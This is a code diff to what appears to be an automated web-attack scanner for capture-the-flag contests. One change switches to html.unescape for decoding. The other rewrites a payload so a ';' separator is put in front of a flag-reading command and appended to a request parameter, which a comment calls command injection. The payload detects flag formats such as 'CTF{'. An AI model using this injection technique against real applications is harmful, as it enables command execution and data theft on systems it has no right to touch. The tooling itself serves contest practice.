@@ -115,8 +115,9 @@ class SmartFingerprinter:
         """
         # Strip HTML tags for source analysis
         clean_body = re.sub(r'<[^>]+>', '', body)
-        # Also handle HTML entities
-        clean_body2 = clean_body.replace('&lt;', '<').replace('&gt;', '>').replace('&amp;', '&').replace('&quot;', '"').replace('&#039;', "'")
+        # Decode ALL HTML entities (nbsp, lt, gt, amp, etc.)
+        import html as _html
+        clean_body2 = _html.unescape(clean_body)
 
         headers_text = '\n'.join(f'{k}: {v}' for k, v in headers.items())
         combined = headers_text + '\n' + clean_body2[:10000]
@@ -430,8 +431,8 @@ class AdaptiveScheduler:
                     'param': (params[0] if params else 'a'),
                     'payload_def': {
                         'name': f'flag:{flag_cmd[:20]}',
-                        'payload': flag_cmd,
-                        'method': 'replace',
+                        'payload': ';' + flag_cmd,   # prefix separator for cmd injection
+                        'method': 'append',            # append so base value stays + cmd injected
                         'detect': 'content',
                         'match': ['flag{', 'CTF{', 'ISCC{', 'Geesec{', 'DASCTF{'],
                         'tip': '直接读flag文件',
